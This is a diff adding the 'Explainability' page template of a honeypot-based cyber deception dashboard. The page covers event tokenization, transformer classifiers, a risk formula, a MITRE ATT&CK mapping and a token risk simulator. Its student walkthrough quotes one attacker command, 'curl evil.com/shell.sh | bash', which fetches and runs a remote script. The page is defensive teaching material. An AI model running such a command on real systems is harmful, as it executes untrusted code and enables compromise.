@@ -1,0 +1,305 @@
+{% extends "base.html" %}
+{% block title %}Explainability — PCD{% endblock %}
+{% block content %}
+<div class="page-header">
+    <h1 class="page-title">💡 Explainability</h1>
+    <p class="page-subtitle">How the Proactive Cyber Deception system detects, classifies, and responds to attacks</p>
+</div>
+
+<!-- ── Pipeline Overview ───────────────────────────────────────────────────── -->
+<div class="panel mb-2">
+    <div class="panel-header"><h2>🔄 Detection Pipeline</h2></div>
+    <div class="pipeline-flow">
+        <div class="pipe-step">
+            <div class="pipe-icon">🍯</div>
+            <div class="pipe-label">Honeypot<br><small>Cowrie / Dionaea</small></div>
+        </div>
+        <div class="pipe-arrow">→</div>
+        <div class="pipe-step">
+            <div class="pipe-icon">🔤</div>
+            <div class="pipe-label">Tokenizer<br><small>Raw events → tokens</small></div>
+        </div>
+        <div class="pipe-arrow">→</div>
+        <div class="pipe-step">
+            <div class="pipe-icon">🤖</div>
+            <div class="pipe-label">DistilBERT<br><small>Attack classifier</small></div>
+        </div>
+        <div class="pipe-arrow">+</div>
+        <div class="pipe-step">
+            <div class="pipe-icon">🔮</div>
+            <div class="pipe-label">XLNet<br><small>Anomaly + next action</small></div>
+        </div>
+        <div class="pipe-arrow">→</div>
+        <div class="pipe-step">
+            <div class="pipe-icon">⚠</div>
+            <div class="pipe-label">Risk Score<br><small>Severity formula</small></div>
+        </div>
+        <div class="pipe-arrow">→</div>
+        <div class="pipe-step">
+            <div class="pipe-icon">🛡</div>
+            <div class="pipe-label">AI Prevention<br><small>Groq LLaMA advice</small></div>
+        </div>
+    </div>
+</div>
+
+<!-- ── Core concept cards ─────────────────────────────────────────────────── -->
+<div class="explain-grid">
+
+    <div class="explain-card">
+        <div class="explain-icon">🍯</div>
+        <h2>What is a Honeypot?</h2>
+        <p>A <strong>honeypot</strong> is a fake computer system intentionally exposed to attract attackers. Everything they do is recorded — while they believe they are on a real server.</p>
+        <div class="example-box">
+            <strong>Two honeypots deployed:</strong><br>
+            <strong>Cowrie</strong> — Emulates SSH and Telnet servers<br>
+            <strong>Dionaea</strong> — Emulates SMB, HTTP, FTP, MySQL<br>
+            🪙 <strong>Canary Tokens</strong> — Fake files/credentials that alert on access
+        </div>
+    </div>
+
+    <div class="explain-card">
+        <div class="explain-icon">🔤</div>
+        <h2>What is Tokenization?</h2>
+        <p><strong>Tokenization</strong> converts raw log events into a compact, standardized vocabulary so the AI models can process them consistently.</p>
+        <div class="token-flow explain-token-flow">
+            <span class="token-chip tok-low">SCAN</span>
+            <span class="flow-arrow">→</span>
+            <span class="token-chip tok-low">RECON</span>
+            <span class="flow-arrow">→</span>
+            <span class="token-chip tok-medium">LOGIN_ATT</span>
+            <span class="flow-arrow">→</span>
+            <span class="token-chip tok-high">LOGIN_OK</span>
+            <span class="flow-arrow">→</span>
+            <span class="token-chip tok-medium">EXEC</span>
+            <span class="flow-arrow">→</span>
+            <span class="token-chip tok-medium">FILE_XFER</span>
+        </div>
+        <div class="token-glossary">
+            <div class="token-def"><code>SCAN</code> — Port/network scan</div>
+            <div class="token-def"><code>RECON</code> — Fingerprinting the target service</div>
+            <div class="token-def"><code>LOGIN_ATT</code> — Failed login attempt</div>
+            <div class="token-def"><code>LOGIN_OK</code> — Successful authentication (danger!)</div>
+            <div class="token-def"><code>EXEC</code> — Shell command executed</div>
+            <div class="token-def"><code>FILE_XFER</code> — File upload or download</div>
+            <div class="token-def"><code>FILE_WRITE</code> — File written to disk</div>
+            <div class="token-def"><code>PRIV_ESC</code> — Privilege escalation attempt</div>
+            <div class="token-def"><code>TUNNEL</code> — Covert channel or C2 connection</div>
+            <div class="token-def"><code>MALWARE</code> — Malicious binary detected</div>
+            <div class="token-def"><code>NET_CONN</code> — Network connection established</div>
+            <div class="token-def"><code>SESS_END</code> — Session terminated</div>
+        </div>
+    </div>
+
+    <div class="explain-card">
+        <div class="explain-icon">🤖</div>
+        <h2>Attack Classification (DistilBERT)</h2>
+        <p><strong>DistilBERT</strong> is a transformer model trained to read a token sequence and classify it as <strong>BENIGN</strong> or <strong>MALICIOUS</strong> with a confidence score.</p>
+        <div class="explain-example">
+            <strong>Input:</strong> <code>[COWRIE] SCAN RECON LOGIN_ATT LOGIN_OK EXEC FILE_XFER</code><br>
+            <strong>Output:</strong> <code>MALICIOUS — 94.2% confidence</code>
+        </div>
+        <div class="metrics-mini" id="exp-db-metrics-mini">
+            <div><strong id="exp-mini-acc">95.6%</strong> accuracy</div>
+            <div><strong id="exp-mini-prec">93.9%</strong> precision</div>
+            <div><strong id="exp-mini-rec">96.9%</strong> recall</div>
+        </div>
+    </div>
+
+    <div class="explain-card">
+        <div class="explain-icon">🔮</div>
+        <h2>Anomaly Detection &amp; Next Action (XLNet)</h2>
+        <p><strong>XLNet</strong> learns the structure of attack sequences. A low <em>perplexity</em> means the sequence follows a known attack pattern — flagged as anomalous. It also predicts what the attacker will do next.</p>
+        <div class="explain-example">
+            <strong>Sequence:</strong> <code>SCAN → RECON → LOGIN_ATT × 4</code><br>
+            <strong>Predicted next:</strong> <code>LOGIN_OK</code> — brute-force may succeed<br>
+            <strong>Perplexity:</strong> <span id="exp-ppl-example">low → HIGH anomaly score</span>
+        </div>
+        <div class="trajectory-examples">
+            <div><code>→ FILE_XFER</code> — Malware download risk</div>
+            <div><code>→ EXEC</code> — Remote code execution risk</div>
+            <div><code>→ TUNNEL</code> — C2 / lateral movement risk</div>
+            <div><code>→ PRIV_ESC</code> — Full compromise risk</div>
+        </div>
+    </div>
+
+    <div class="explain-card">
+        <div class="explain-icon">⚠</div>
+        <h2>How is Risk Calculated?</h2>
+        <p>The <strong>combined severity</strong> formula fuses three independent signals into a single risk score:</p>
+        <div class="formula-box">
+            <code>severity = (token_sev − 1) × 0.25 + attack_prob × 1.50 + anomaly × 1.25</code>
+        </div>
+        <div class="risk-legend-explain">
+            <div class="risk-row-explain"><span class="risk-dot risk-low"></span><strong>LOW</strong> — Routine scanning, no access gained</div>
+            <div class="risk-row-explain"><span class="risk-dot risk-medium"></span><strong>MEDIUM</strong> — Brute-force or limited execution</div>
+            <div class="risk-row-explain"><span class="risk-dot risk-high"></span><strong>HIGH</strong> — Successful login or privilege escalation</div>
+            <div class="risk-row-explain"><span class="risk-dot risk-critical"></span><strong>CRITICAL</strong> — Active exploitation, malware, or file deletion</div>
+        </div>
+    </div>
+
+    <div class="explain-card">
+        <div class="explain-icon">🧠</div>
+        <h2>AI Prevention Advice (Groq LLaMA)</h2>
+        <p>For every HIGH/CRITICAL event, the system sends the full attack context to Groq LLaMA to generate structured, context-specific prevention advice. Results are cached in MongoDB for 24 hours.</p>
+        <div class="explain-example">
+            <strong>Categories returned:</strong><br>
+            🔴 <strong>Access Control</strong> — Immediate, short-term, long-term<br>
+            🌐 <strong>Network Security</strong> — Firewall, IDS, egress rules<br>
+            🖥 <strong>Host Hardening</strong> — EDR, patch, filesystem monitoring
+        </div>
+        <div class="example-box">
+            Falls back gracefully to <strong>static templates</strong> when no API key is configured or Groq is unavailable.
+        </div>
+    </div>
+
+</div>
+
+<!-- ── Interactive Token Simulator ───────────────────────────────────────── -->
+<div class="panel mt-2 mb-2">
+    <div class="panel-header">
+        <h2>🔬 Interactive Attack Simulator</h2>
+        <small class="panel-hint">Build a token sequence and see the predicted risk level</small>
+    </div>
+    <div class="simulator-body">
+        <div class="sim-token-palette">
+            <strong>Click tokens to add:</strong>
+            <div class="sim-palette-row" id="sim-palette"></div>
+        </div>
+        <div class="sim-sequence-area">
+            <div class="sim-seq-label">Your sequence: <button class="sim-clear-btn" onclick="simClear()">✕ Clear</button></div>
+            <div class="token-flow explain-token-flow" id="sim-sequence"><em style="color:var(--text-muted);font-size:0.85rem">No tokens yet — click above to add</em></div>
+        </div>
+        <div class="sim-result" id="sim-result" style="display:none">
+            <div class="sim-risk-badge" id="sim-risk-badge">—</div>
+            <div class="sim-result-detail" id="sim-result-detail"></div>
+        </div>
+    </div>
+</div>
+
+<!-- ── MITRE ATT&CK Mapping ───────────────────────────────────────────────── -->
+<div class="panel mt-2 mb-2">
+    <div class="panel-header"><h2>🗺 MITRE ATT&CK Token Mapping</h2></div>
+    <div class="metrics-table">
+        <table class="data-table">
+            <thead><tr><th>Token</th><th>MITRE Tactic</th><th>Technique</th><th>Risk</th></tr></thead>
+            <tbody>
+                <tr><td><code>SCAN</code></td><td>Reconnaissance</td><td>T1595 – Active Scanning</td><td><span class="risk-badge risk-low">LOW</span></td></tr>
+                <tr><td><code>RECON</code></td><td>Reconnaissance</td><td>T1592 – Gather Host Info</td><td><span class="risk-badge risk-low">LOW</span></td></tr>
+                <tr><td><code>LOGIN_ATT</code></td><td>Credential Access</td><td>T1110 – Brute Force</td><td><span class="risk-badge risk-medium">MEDIUM</span></td></tr>
+                <tr><td><code>LOGIN_OK</code></td><td>Initial Access</td><td>T1078 – Valid Accounts</td><td><span class="risk-badge risk-high">HIGH</span></td></tr>
+                <tr><td><code>EXEC</code></td><td>Execution</td><td>T1059 – Command & Scripting Interpreter</td><td><span class="risk-badge risk-medium">MEDIUM</span></td></tr>
+                <tr><td><code>PRIV_ESC</code></td><td>Privilege Escalation</td><td>T1068 – Exploitation for Privilege</td><td><span class="risk-badge risk-high">HIGH</span></td></tr>
+                <tr><td><code>FILE_XFER</code></td><td>Command and Control</td><td>T1105 – Ingress Tool Transfer</td><td><span class="risk-badge risk-high">HIGH</span></td></tr>
+                <tr><td><code>TUNNEL</code></td><td>Command and Control</td><td>T1572 – Protocol Tunneling</td><td><span class="risk-badge risk-critical">CRITICAL</span></td></tr>
+                <tr><td><code>MALWARE</code></td><td>Execution</td><td>T1204 – User Execution / Malicious File</td><td><span class="risk-badge risk-critical">CRITICAL</span></td></tr>
+                <tr><td><code>NET_CONN</code></td><td>Command and Control</td><td>T1071 – Application Layer Protocol</td><td><span class="risk-badge risk-medium">MEDIUM</span></td></tr>
+                <tr><td><code>FILE_DEL</code></td><td>Defense Evasion</td><td>T1070 – Indicator Removal</td><td><span class="risk-badge risk-high">HIGH</span></td></tr>
+                <tr><td><code>PERM_CHG</code></td><td>Defense Evasion</td><td>T1222 – File Permissions Modification</td><td><span class="risk-badge risk-medium">MEDIUM</span></td></tr>
+            </tbody>
+        </table>
+    </div>
+</div>
+
+<!-- ── Guided walkthrough (student-only) ─────────────────────────────────── -->
+{% if current_user.is_student() %}
+<div class="panel student-walkthrough mt-2">
+    <div class="panel-header"><h2>🎯 Guided Walkthrough: A Real Attack</h2></div>
+    <div class="walkthrough-steps">
+        <div class="ws-step"><div class="ws-num">1</div>
+            <div class="ws-body"><strong>Attacker scans</strong> — Maps open ports on our honeypot. Token: <span class="token-chip tok-low">SCAN</span></div></div>
+        <div class="ws-step"><div class="ws-num">2</div>
+            <div class="ws-body"><strong>Reconnaissance</strong> — Probes SSH version. Token: <span class="token-chip tok-low">RECON</span></div></div>
+        <div class="ws-step"><div class="ws-num">3</div>
+            <div class="ws-body"><strong>Brute-force</strong> — Tries 100+ password combinations. Each failure: <span class="token-chip tok-medium">LOGIN_ATT</span></div></div>
+        <div class="ws-step"><div class="ws-num">4</div>
+            <div class="ws-body"><strong>Login success</strong> — Guesses "admin/password123". Token: <span class="token-chip tok-high">LOGIN_OK</span> — DistilBERT flags <strong>MALICIOUS</strong></div></div>
+        <div class="ws-step"><div class="ws-num">5</div>
+            <div class="ws-body"><strong>Command execution</strong> — Runs <code>whoami</code>, <code>curl evil.com/shell.sh | bash</code>. Token: <span class="token-chip tok-medium">EXEC</span></div></div>
+        <div class="ws-step"><div class="ws-num">6</div>
+            <div class="ws-body"><strong>Malware downloaded</strong> — Transfers malicious file. Token: <span class="token-chip tok-medium">FILE_XFER</span> — XLNet predicts: <code>→ EXEC</code></div></div>
+        <div class="ws-step"><div class="ws-num">7</div>
+            <div class="ws-body"><strong>Session ends</strong> — Token: <span class="token-chip tok-critical">SESS_END</span> — Severity: <strong>CRITICAL</strong> — AI prevention advice generated.</div></div>
+    </div>
+    <div class="explain-example mt-1">
+        <strong>Why honeypots matter:</strong> Without a honeypot, the attacker would have reached a real production server. With proactive deception, every step was recorded from Step 1, giving defenders time to block the IP before real systems are touched.
+    </div>
+</div>
+{% endif %}
+
+{% endblock %}
+{% block scripts %}
+<script src="{{ url_for('static', filename='js/reports.js') }}"></script>
+<script>
+// ── Interactive Token Simulator ───────────────────────────────────────────
+const TOKEN_RISK = {
+    SCAN:'LOW', RECON:'LOW', NET_BIND:'LOW', NET_CLOSE:'LOW', SESS_END:'LOW',
+    LOGIN_ATT:'MEDIUM', EXEC:'MEDIUM', FILE_OPEN:'MEDIUM', FILE_ACC:'MEDIUM',
+    NET_CONN:'MEDIUM', NET_SEND:'MEDIUM', PERM_CHG:'MEDIUM',
+    LOGIN_OK:'HIGH', FILE_XFER:'HIGH', FILE_WRITE:'HIGH', FILE_MOD:'HIGH',
+    PRIV_ESC:'HIGH', FILE_DEL:'HIGH', NET_CONNECT:'HIGH',
+    TUNNEL:'CRITICAL', MALWARE:'CRITICAL', EXPLOIT:'CRITICAL', PROC_EXEC:'CRITICAL'
+};
+const RISK_CLASS = {LOW:'tok-low', MEDIUM:'tok-medium', HIGH:'tok-high', CRITICAL:'tok-critical'};
+const RISK_COLOR = {LOW:'#10b981', MEDIUM:'#f59e0b', HIGH:'#f97316', CRITICAL:'#ef4444'};
+
+let simTokens = [];
+
+const palette = document.getElementById('sim-palette');
+Object.entries(TOKEN_RISK).forEach(([tok, risk]) => {
+    const btn = document.createElement('button');
+    btn.className = `token-chip ${RISK_CLASS[risk]} sim-tok-btn`;
+    btn.textContent = tok;
+    btn.title = `Risk: ${risk}`;
+    btn.addEventListener('click', () => simAdd(tok));
+    palette.appendChild(btn);
+});
+
+function simAdd(tok) {
+    simTokens.push(tok);
+    renderSimSeq();
+    calcSimRisk();
+}
+function simClear() {
+    simTokens = [];
+    document.getElementById('sim-sequence').innerHTML = '<em style="color:var(--text-muted);font-size:0.85rem">No tokens yet — click above to add</em>';
+    document.getElementById('sim-result').style.display = 'none';
+}
+function renderSimSeq() {
+    const el = document.getElementById('sim-sequence');
+    el.innerHTML = simTokens.map((t,i) =>
+        `${i>0?'<span class="flow-arrow">→</span>':''}<span class="token-chip ${RISK_CLASS[TOKEN_RISK[t]||'LOW']}">${t}</span>`
+    ).join('');
+}
+function calcSimRisk() {
+    if (!simTokens.length) return;
+    const riskOrder = {LOW:0, MEDIUM:1, HIGH:2, CRITICAL:3};
+    // Compute max risk from tokens
+    let maxRisk = 'LOW';
+    let score = 0;
+    simTokens.forEach(t => {
+        const r = TOKEN_RISK[t] || 'LOW';
+        if (riskOrder[r] > riskOrder[maxRisk]) maxRisk = r;
+        score += {LOW:0.1, MEDIUM:0.3, HIGH:0.6, CRITICAL:1.0}[r];
+    });
+    // Escalate based on combinations
+    const set = new Set(simTokens);
+    if (set.has('LOGIN_OK') && set.has('EXEC')) maxRisk = riskOrder[maxRisk] < 2 ? 'HIGH' : maxRisk;
+    if (set.has('LOGIN_OK') && (set.has('FILE_XFER') || set.has('MALWARE'))) maxRisk = 'CRITICAL';
+    if (set.has('TUNNEL') || set.has('PRIV_ESC')) maxRisk = riskOrder[maxRisk] < 3 ? (maxRisk === 'CRITICAL' ? 'CRITICAL' : 'HIGH') : maxRisk;
+
+    const tips = {
+        LOW: '✅ Routine activity — reconnaissance only. Monitor for follow-up.',
+        MEDIUM: '⚠ Escalating activity. Consider rate-limiting this source.',
+        HIGH: '🔴 Active threat — credentials or privilege at risk. Act immediately.',
+        CRITICAL: '🚨 Full compromise risk — isolate, block, and escalate NOW.'
+    };
+    const badge = document.getElementById('sim-risk-badge');
+    const detail = document.getElementById('sim-result-detail');
+    badge.textContent = maxRisk;
+    badge.className = `sim-risk-badge risk-${maxRisk.toLowerCase()}`;
+    badge.style.borderColor = RISK_COLOR[maxRisk];
+    detail.innerHTML = `<strong>Cumulative score:</strong> ${score.toFixed(2)} &nbsp;|&nbsp; <strong>Tokens:</strong> ${simTokens.length}<br>${tips[maxRisk]}`;
+    document.getElementById('sim-result').style.display = '';
+}
+</script>
+{% endblock %}
